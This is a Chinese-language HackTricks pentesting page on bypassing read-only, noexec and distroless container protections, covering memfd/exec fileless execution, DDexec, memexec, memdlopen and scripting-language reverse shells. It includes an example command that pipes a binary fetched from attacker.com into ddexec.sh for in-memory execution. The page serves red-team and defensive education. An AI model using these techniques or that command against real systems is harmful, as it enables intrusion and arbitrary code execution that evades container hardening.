# 绕过文件系统保护：只读/无执行权限/Distroless

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

## 视频

在以下视频中，你可以找到本页面中提到的技术的更详细解释：

* [**DEF CON 31 - 探索 Linux 内存操作以进行隐蔽和逃避**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**使用 DDexec-ng 和内存 dlopen() 进行隐蔽入侵 - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## 只读/无执行权限场景

在 Linux 机器上，特别是容器中，越来越常见的是使用**只读 (ro) 文件系统保护**。这是因为在容器中运行只读文件系统非常简单，只需在 `securitycontext` 中设置 **`readOnlyRootFilesystem: true`**：

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

然而，即使文件系统以只读方式挂载，**`/dev/shm`** 仍然是可写的，所以我们可以在磁盘上写入内容。然而，该文件夹将以**无执行权限保护**方式挂载，因此如果你在此处下载一个二进制文件，你将**无法执行它**。

{% hint style="warning" %}
从红队的角度来看，这使得下载和执行**不在系统中的二进制文件**（如后门或枚举器，如 `kubectl`）变得复杂。
{% endhint %}

## 最简单的绕过方法：脚本

请注意，我提到的是二进制文件，只要解释器在机器上，你可以**执行任何脚本**，比如如果存在 `sh`，你可以执行**shell 脚本**，如果安装了 `python`，你可以执行**Python 脚本**。

然而，仅仅执行脚本是不够的，你可能需要运行你的二进制后门或其他二进制工具。

## 内存绕过

如果你想执行一个二进制文件，但文件系统不允许执行，那么最好的方法是**从内存中执行**，因为**保护措施在内存中不适用**。

### FD + exec 系统调用绕过

如果你在机器上有一些强大的脚本引擎，比如**Python**、**Perl**或**Ruby**，你可以将要执行的二进制文件下载到内存中，并将其存储在一个内存文件描述符（`create_memfd` 系统调用）中，这不会受到这些保护的限制，然后调用**`exec` 系统调用**，将**文件描述符作为要执行的文件**。

为此，你可以轻松使用项目 [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec)。你可以将二进制文件传递给它，它将生成一个指定语言的脚本，其中包含**压缩和 base64 编码的二进制文件**，以及解码和解压缩它的指令，这些指令将在调用 `create_memfd` 系统调用创建的**文件描述符**中执行，并调用**exec**系统调用来运行它。

{% hint style="warning" %}
这在其他脚本语言（如 PHP 或 Node）中不起作用，因为它们没有任何**默认的调用原始系统调用**的方法，所以无法调用 `create_memfd` 来创建**内存文件描述符**来存储二进制文件。

此外，在 `/dev/shm` 中创建一个**常规文件描述符**是行不通的，因为你将无法运行它，因为**无执行权限保护**将适用。
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) 是一种技术，允许你通过覆盖其**`/proc/self/mem`**来**修改自己进程的内存**。

因此，通过控制进程执行的汇编代码，你可以编写一个**shellcode**并"变异"进程以**执行任意代码**。

{% hint style="success" %}
**DDexec / EverythingExec** 将允许你从**内存**中加载和**执行**自己的**shellcode**或**任何二进制文件**。
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
有关此技术的更多信息，请查看Github或：

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) 是 DDexec 的自然下一步。它是一个 **DDexec shellcode 守护进程**，因此每当您想要 **运行不同的二进制文件** 时，您无需重新启动 DDexec，只需通过 DDexec 技术运行 memexec shellcode，然后 **与此守护进程通信以传递要加载和运行的新二进制文件**。

您可以在 [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) 中找到一个使用 **memexec 执行来自 PHP 反向 shell 的二进制文件** 的示例。

### Memdlopen

与 DDexec 目的类似，[**memdlopen**](https://github.com/arget13/memdlopen) 技术允许以更简单的方式将二进制文件加载到内存中，以便稍后执行它们。它甚至可以加载具有依赖关系的二进制文件。

## Distroless Bypass

### 什么是 distroless

Distroless 容器仅包含运行特定应用程序或服务所需的 **最少组件**，例如库和运行时依赖项，但不包括诸如软件包管理器、shell 或系统实用程序等较大的组件。

Distroless 容器的目标是通过消除不必要的组件来 **减少容器的攻击面**，并最小化可以被利用的漏洞数量。

### 反向 Shell

在 distroless 容器中，您可能 **找不到 `sh` 或 `bash`** 以获取常规 shell。您也不会找到诸如 `ls`、`whoami`、`id` 等二进制文件... 这些通常在系统中运行的所有内容。

{% hint style="warning" %}
因此，您将无法像通常那样获得 **反向 shell** 或 **枚举** 系统。
{% endhint %}

但是，如果受损的容器例如运行了 Flask Web，则已安装了 Python，因此您可以获取 **Python 反向 shell**。如果运行了 Node，则可以获取 Node 反向 shell，其他 **脚本语言** 也是如此。

{% hint style="success" %}
使用脚本语言，您可以使用语言的功能 **枚举系统**。
{% endhint %}

如果没有 **只读/无执行** 保护，您可以滥用反向 shell 来在文件系统中 **写入您的二进制文件** 并 **执行** 它们。

{% hint style="success" %}
然而，在这种类型的容器中，通常会存在这些保护措施，但您可以使用 **先前的内存执行技术来绕过它们**。
{% endhint %}

您可以在 [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) 中找到一些利用 **RCE 漏洞** 获取脚本语言 **反向 shell** 并从内存中执行二进制文件的 **示例**。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在 **网络安全公司** 工作吗？您想在 HackTricks 中看到您的 **公司广告** 吗？或者您想获得 **PEASS 的最新版本或下载 PDF 格式的 HackTricks** 吗？请查看 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass)，或在 **Twitter** 上 **关注** 我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享您的黑客技巧。**

</details>
